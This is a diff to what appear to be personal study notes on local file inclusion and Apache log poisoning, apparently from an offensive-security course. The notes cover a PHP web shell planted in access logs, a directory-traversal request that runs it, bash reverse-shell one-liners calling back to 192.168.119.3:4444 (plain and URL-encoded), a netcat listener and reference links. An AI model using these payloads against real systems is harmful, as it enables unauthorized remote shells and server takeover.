@@ -100,6 +100,23 @@ GET /meteor/index.php?page=../../../../../../../var/log/apache2/access.log&cmd=l
 Previously we uploaded <?php echo system($_GET['cmd']); ?> to the log. Doing a directory traversal to that file executes the php code in the file which grabs the cmd parameter.
 the cmd parameter has ls -la with the space inbetween url encoded
 
+bash one-liner for reverse shell
+bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
+
+php uses bourne for shell instead of bash... will need to use the following one-liner instead
+bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+
+php bash one-liner with encoding
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+
+start a netcat listener 
+nc -nvlp 4444
+
+XAMPP apache logs are stored at C:\xampp\apache\logs\
+
+We can also do LFI in Pearl, ASP, ASPE, JSP or even Node.js
+
+
 
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
@@ -107,6 +124,23 @@ the cmd parameter has ls -la with the space inbetween url encoded
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 Extra Reading   
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
+9.2.1. Local File Inclusion (LFI)
+https://owasp.org/www-community/attacks/Log_Injection
+https://httpd.apache.org/docs/2.4/logs.html
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent
+https://www.php.net/manual/en/function.system.php
+https://www.php.net/manual/en/function.echo.php
+https://en.wikipedia.org/wiki/Input_Field_Separators
+https://www.w3schools.com/tags/ref_urlencode.asp
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
+https://en.wikipedia.org/wiki/Bourne_shell
+https://www.apachefriends.org/index.html
+https://www.perl.org/
+https://en.wikipedia.org/wiki/ASP.NET
+https://en.wikipedia.org/wiki/Active_Server_Pages
+https://en.wikipedia.org/wiki/Jakarta_Server_Pages
+https://nodejs.org/en/
+
 
 9.2. File Inclusion Vulnerabilities
 https://en.wikipedia.org/wiki/File_inclusion_vulnerability
